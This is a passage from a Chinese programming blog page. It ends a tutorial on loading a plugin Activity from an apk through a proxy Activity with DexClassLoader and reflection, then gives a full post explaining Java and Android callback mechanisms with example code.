localConstructor.newInstance(<span class="keyword">new</span> Object[] &#123;&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将代理对象设置给插件Activity</span></span><br><span class="line">            Method setProxy = pluginClass.getMethod(<span class="string">&quot;setProxy&quot;</span>,<span class="keyword">new</span> Class[] &#123; Activity.class &#125;); </span><br><span class="line">            setProxy.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            setProxy.invoke(pluginActivity, <span class="keyword">new</span> Object[] &#123; <span class="keyword">this</span> &#125;);</span><br><span class="line">            </span><br><span class="line">            initMethodMap();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用它的onCreate方法</span></span><br><span class="line">            Method onCreate = pluginClass.getDeclaredMethod(<span class="string">&quot;onCreate&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123; Bundle.class &#125;);</span><br><span class="line">            onCreate.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            onCreate.invoke(pluginActivity, <span class="keyword">new</span> Object[] &#123; <span class="keyword">new</span> Bundle() &#125;);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;load activity error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存储每个生命周期的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initMethodMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        methodMap.put(<span class="string">&quot;onPause&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        methodMap.put(<span class="string">&quot;onResume&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        methodMap.put(<span class="string">&quot;onStart&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        methodMap.put(<span class="string">&quot;onStop&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        methodMap.put(<span class="string">&quot;onDestroy&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(String key : methodMap.keySet())&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Method method = pluginClass.getDeclaredMethod(key);</span><br><span class="line">                method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                methodMap.put(key, method);</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;get method error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@SuppressLint(&quot;NewApi&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> DexClassLoader <span class="title">initClassLoader</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String filesDir = <span class="keyword">this</span>.getCacheDir().getAbsolutePath();</span><br><span class="line">        String libPath = filesDir + File.separator + <span class="string">&quot;PluginActivity.apk&quot;</span>;</span><br><span class="line">        Log.i(<span class="string">&quot;inject&quot;</span>, <span class="string">&quot;fileexist:&quot;</span>+<span class="keyword">new</span> File(libPath).exists());</span><br><span class="line">        loadResources(libPath);</span><br><span class="line">        DexClassLoader loader = <span class="keyword">new</span> DexClassLoader(libPath, filesDir, <span class="keyword">null</span> , getClass().getClassLoader());</span><br><span class="line">        <span class="keyword">return</span> loader;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;proxy onDestroy&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            methodMap.get(<span class="string">&quot;onDestroy&quot;</span>).invoke(pluginActivity, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;run destroy error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPause</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onPause();</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;proxy onPause&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            methodMap.get(<span class="string">&quot;onPause&quot;</span>).invoke(pluginActivity, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;run pause error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onResume();</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;proxy onResume&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            methodMap.get(<span class="string">&quot;onResume&quot;</span>).invoke(pluginActivity, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;run resume error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStart();</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;proxy onStart&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            methodMap.get(<span class="string">&quot;onStart&quot;</span>).invoke(pluginActivity, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;run start error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onStop();</span><br><span class="line">        Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;proxy onStop&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            methodMap.get(<span class="string">&quot;onStop&quot;</span>).invoke(pluginActivity, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            Log.i(<span class="string">&quot;demo&quot;</span>, <span class="string">&quot;run stop error:&quot;</span> + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里主要就是：</p>
<ul>
<li>加载插件Activity</li>
<li>使用反射将代理对象设置给插件Activity</li>
<li>测试插件Activity中的生命周期方法</li>
</ul>
<p>运行程序，将上面的PluginActivity.apk放到宿主项目的cache目录下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb push PluginActivity.apk &#x2F;data&#x2F;data&#x2F;com.example.dynamic.activity&#x2F;cache</span><br></pre></td></tr></table></figure>
<p>运行宿主项目就能看到效果了。同时我们打印一下Log：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ adb logcat -s demo</span><br><span class="line">...</span><br><span class="line">I&#x2F;demo    (27983): proxy onStart</span><br><span class="line">I&#x2F;demo    (27983): onStart</span><br><span class="line">I&#x2F;demo    (27983): proxy onResume</span><br><span class="line">I&#x2F;demo    (27983): onResume</span><br><span class="line">I&#x2F;demo    (27983): proxy onPause</span><br><span class="line">I&#x2F;demo    (27983): onPause</span><br><span class="line">I&#x2F;demo    (27983): proxy onStop</span><br><span class="line">I&#x2F;demo    (27983): onStop</span><br><span class="line">I&#x2F;demo    (27983): proxy onDestroy</span><br><span class="line">I&#x2F;demo    (27983): onDestory</span><br><span class="line">I&#x2F;demo    (28565): proxy onStart</span><br><span class="line">I&#x2F;demo    (28565): onStart</span><br><span class="line">I&#x2F;demo    (28565): proxy onResume</span><br><span class="line">I&#x2F;demo    (28565): onResume</span><br><span class="line">I&#x2F;demo    (28565): proxy onPause</span><br><span class="line">I&#x2F;demo    (28565): onPause</span><br><span class="line">I&#x2F;demo    (28565): proxy onStop</span><br><span class="line">I&#x2F;demo    (28565): onStop</span><br><span class="line">I&#x2F;demo    (28565): proxy onDestroy</span><br><span class="line">I&#x2F;demo    (28565): onDestory</span><br></pre></td></tr></table></figure>
<p>插件Activity的每个生命周期的方法也是都执行了。<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1pKBSkDt">项目下载</a></p>
<h3 id="两种方式的比较"><a href="#两种方式的比较" class="headerlink" title="两种方式的比较"></a>两种方式的比较</h3><p>第一种方式：使用反射机制来实现<br>优点：可以不用太多的关心插件中的Activity的生命周期方法，因为他加载进来之后就是一个真正意义上的Activity了<br>缺点：需要在宿主工程中进行声明，如果插件中的Activity多的话，那么就不灵活了。<br>第二种方式：使用代理机制来实现<br>优点：不需要在宿主工程中进行声明太多的Activity了，只需要有一个代理Activity的声明就可以了，很灵活<br>缺点：需要管理手动的去管理插件中Activity的生命周期方法，难度复杂。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/jiangwei0910410003/article/details/48104455">http://blog.csdn.net/jiangwei0910410003/article/details/48104455</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/08/22/Java%E7%9A%84%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/08/22/Java%E7%9A%84%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Java的回调机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-08-22 22:07:48" itemprop="dateCreated datePublished" datetime="2016-08-22T22:07:48+08:00">2016-08-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>回调机制就是A类中调用B类中的某个方法C，然后B类中反过来调用A类中的方法D，D这个方法就叫回调方法。下面结合经典的例子进行说明：</p>
<ul>
<li>Class A实现接口CallBack callback —— 背景1</li>
<li>Class A中包含一个Class B的引用b —— 背景2</li>
<li>Class B有一个参数为callback的方法C(CallBack callback) —— 背景3</li>
<li>A的对象a调用B的方法C(CallBack callback) —— A类调用B类的某个方法C</li>
<li>然后b就可以在C(CallBack callback)方法中调用A的方法 —— B类调用A类的某个方法D</li>
</ul>
<p>采用一个异步加回调的例子：小王遇到一个问题”1+1=?”，就打电话给小张，小张一下子也不知道，就跟小王说，等我办完手上的事再帮你解决，小王就对小张说，那我先去逛个街，你知道答案就打电话告诉我，说完挂了电话自己办自己的事了，过了一阵时间小张给小王打电话，告诉他答案是2。<br>CallBack.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个回调接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CallBack</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这个是小张知道答案时要调用的告诉小王的函数，也就是回调函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">(String result)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Wang.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个是小王，实现了一个回调接口，相当于 —— 背景1</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wang</span> <span class="keyword">implements</span> <span class="title">CallBack</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 小张对象的引用，相当于 —— 背景2</span></span><br><span class="line">    <span class="keyword">private</span> Zhang zhang;</span><br><span class="line">    <span class="comment">// 小王的构造方法，持有小张的引用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Wang</span><span class="params">(Zhang zhang)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.zhang = zhang;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 小王通过这个方法去问小张问题</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">askQuestion</span><span class="params">(<span class="keyword">final</span> String question)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 小王调用小张中的方法，在这里注册回调接口</span></span><br><span class="line">                <span class="comment">// 相当于 —— A类调用B的方法C</span></span><br><span class="line">                zhang.executeMessage(Wang.<span class="keyword">this</span>, question);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="comment">// 小王问完问题就挂了电话干别的事了</span></span><br><span class="line">        play();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我要去逛街了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 小张知道答案后调用此方法告诉小王，这就是所谓的小王的回调方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">(String result)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小张告诉小王的答案是：&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Zhang.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个是小张</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Zhang</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 相当于B类的方法C(CallBack callback) —— 背景3</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeMessage</span><span class="params">(CallBack callBack, String question)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小王的问题：&quot;</span> + question);</span><br><span class="line">        <span class="comment">// 模拟小张办自己的事</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 小张办完自己的事情之后想到了答案是2</span></span><br><span class="line">        String result = <span class="string">&quot;答案是2&quot;</span>;</span><br><span class="line">        <span class="comment">// 于是就打电话告诉小王，调用小王中的方法，相当于 —— B类调用A的方法D</span></span><br><span class="line">        callBack.solve(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Test.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Zhang zhang = <span class="keyword">new</span> Zhang();</span><br><span class="line">        Wang wang = <span class="keyword">new</span> Wang(zhang);</span><br><span class="line">        wang.askQuestion(<span class="string">&quot;1+1=?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">小王的问题：1+1&#x3D;?</span><br><span class="line">我要去逛街了</span><br><span class="line">小张告诉小王的答案是：答案是2</span><br></pre></td></tr></table></figure>
<p>上面的例子是异步回调，下面讲一下Android中一个典型的同步回调，<code>onClick()</code>方法。<br>现在来分析一下Android View的点击方法onClick()，onClick()是一个回调方法，当用户点击View就执行这个方法，我们用View的一个子类Button来举例。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个是View的一个回调接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个相当于Class A，实现了OnClickListener接口 —— 背景1</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Class A包含Class B的引用 —— 背景2</span></span><br><span class="line">    <span class="keyword">private</span> Button button；</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        button = (Button)findViewById(R.id.button1);</span><br><span class="line">        <span class="comment">// Class A调用View的方法，因为Button extends View —— A类调用B类的某个方法C</span></span><br><span class="line">        button.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(getApplication(), <span class="string">&quot;OnClick&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是View类的setOnClickListener方法，就相当于B类，只贴了关键代码。  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">View</span> <span class="keyword">implements</span> <span class="title">Drawable</span>.<span class="title">Callback</span>, <span class="title">KeyEvent</span>.<span class="title">Callback</span>, <span class="title">AccessibilityEventSource</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> OnClickListener mOnClickListener;</span><br><span class="line">    <span class="comment">// setOnClickListener()的参数是OnClickListener接口 —— 背景3</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setOnClickListner</span><span class="params">(OnClickListener l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isClickable()) &#123;</span><br><span class="line">            setClickable(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mOnClickListener = l;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">performClick</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED);</span><br><span class="line">        <span class="keyword">if</span> (mOnClickListener != <span class="keyword">null</span>) &#123;</span><br><span class="line">            playSoundEffect(SoundEffectConstants.CLICK);</span><br><span class="line">            <span class="comment">// 相当于B类调用A类的某个方法D，这个D就是所谓的回调方法</span></span><br><span class="line">            mOnClickListener.onClick(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>线程run()也是一个回调方法，当执行Thread的start()方法就会回调这个run()方法，还有处理消息都比较经典。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/xiaanming/article/details/8703708">http://blog.csdn.net/xiaanming/article/details/8703708</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
